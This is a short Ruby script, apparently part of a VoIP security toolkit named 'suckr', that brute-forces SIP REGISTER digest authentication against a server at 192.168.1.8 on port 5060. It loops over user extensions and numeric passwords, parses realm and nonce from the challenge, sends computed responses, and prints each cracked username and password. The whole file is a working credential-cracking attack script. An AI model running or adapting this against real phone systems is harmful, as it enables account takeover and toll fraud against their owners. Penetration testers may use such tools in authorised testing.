#!/usr/bin/env ruby
$LOAD_PATH << File.expand_path(File.join(File.dirname(__FILE__), '../lib'))
require 'socket'
require 'digest/md5'
require 'suckr'


user_min=300 
user_max=300
pass_min=100
pass_max=101


method="REGISTER"
domain="192.168.1.8"
uri="sip:#{domain}"

port=5060

# open up a udp socket to send messages
sock = UDPSocket.new

for user in user_min..user_max
  puts "brute forcing user #{user} on #{domain} with password range #{pass_min}-#{pass_max}"
  start = Time.now
  for pass in pass_min..pass_max
    # setup the initial registration sip message

    # send it a registration message
    sock.send(Suckr::Sip.send_register(uri,port,user,domain),0,domain,port)
    # listen for response
    reg_response=sock.recvfrom(1755)
    # get the Authorization header and parse out the realm and nonce
    realm=""
    nonce=""
    reg_response[0].split("\r\n").each do | header |
      if(header =~ /^WWW-Authenticate/)
        if(header =~ /realm="([a-zA-Z0-9_\.]+)"/)
          realm=$1
        end
        if(header =~ /nonce="([a-zA-Z0-9_\.]+)"/)
            nonce=$1
        end
      end
    end

    # generate the reponse
    if(realm!="" && nonce!="")
      response=Suckr::Response.create(user,realm,pass,method,uri,nonce)
    end

    # send the sip message
    sock.send(Suckr::Sip.send_register_auth(uri,port,user,domain,realm,nonce,response),0,domain,port)

    # listen for response
    auth_response=sock.recvfrom(1755)
    if(auth_response[0] =~ /200 OK/)
       puts "#{user},#{pass},#{domain}"
       # we have cracked a password - so we can break out of the inner loop
       elapsed = Time.now - start
       puts "<-- took #{elapsed} seconds to crack user #{user} -->"
       break
    end
  end 
end
